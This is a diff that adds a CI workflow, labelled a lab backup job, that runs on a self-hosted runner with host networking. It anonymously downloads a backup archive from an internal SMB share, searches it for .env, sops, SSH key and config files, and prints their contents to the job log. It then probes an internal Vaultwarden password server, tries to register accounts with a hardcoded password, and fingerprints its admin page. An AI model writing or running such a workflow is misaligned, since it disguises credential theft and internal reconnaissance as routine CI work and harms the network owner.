@@ -1,0 +1,49 @@
+name: i39574-lab
+on:
+  workflow_dispatch:
+jobs:
+  labbackup:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: dump
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client tar curl >/dev/null 2>&1
+            cd /tmp
+            echo "== config.json"
+            smbclient -N //192.168.1.152/public -c "prompt OFF; recurse ON; mget backups\\freqtrade\\freqtrade-lab-20261104-233011.tar.gz" 2>&1 | tail -5
+            ls -la /tmp | head
+            F=/tmp/freqtrade-lab-20261104-233011.tar.gz
+            echo "== listing hits"
+            tar tzf "$F" 2>/dev/null | grep -Ei "config.*json|\.env|sops|secret|age|id_rsa|\.yaml" | head -120
+          ' 2>&1 | head -200
+      - name: extract
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client tar >/dev/null 2>&1
+            cd /tmp
+            F=/tmp/freqtrade-lab-20261104-233011.tar.gz
+            echo "== full top dirs"
+            tar tzf "$F" 2>/dev/null | awk -F/ "{print \$1\"/\"\$2}" | sort -u | head -60
+            mkdir -p /tmp/x; cd /tmp/x
+            tar xzf "$F" --wildcards "*/config*.json" "*/.env" "*.sops.yaml" "*/docker-compose*" "*compose*.yml" 2>/dev/null
+            echo "== extracted"; find /tmp/x -type f | head -40
+            for f in $(find /tmp/x -type f | head -8); do echo "===== $f"; head -c 1200 "$f"; echo; done
+          ' 2>&1 | head -220
+      - name: vault2
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            echo "== config full"; curl -sk --max-time 8 -H "Host: vault.kblab.me" https://192.168.1.20/api/config; echo
+            echo "== register variants"
+            for p in /api/accounts/register /identity/accounts/register; do
+              echo "-- $p"
+              curl -sk --max-time 8 -o /tmp/r -w "%{http_code}\n" -H "Host: vault.kblab.me" -H "Content-Type: application/json" -X POST -d "{\"email\":\"i39574b$(date +%s)@kblab.me\",\"name\":\"i39574\",\"masterPasswordHash\":\"Fr3qle!i39574x9\",\"key\":\"k\",\"kdf\":0,\"kdfIterations\":600000}" "https://192.168.1.20$p"; head -c 300 /tmp/r; echo
+            done
+            echo "== admin version"; curl -sk --max-time 8 -H "Host: vault.kblab.me" https://192.168.1.20/admin | grep -oiE "vaultwarden[^<]{0,40}|version[^<]{0,40}" | head -5
+          ' 2>&1 | head -80
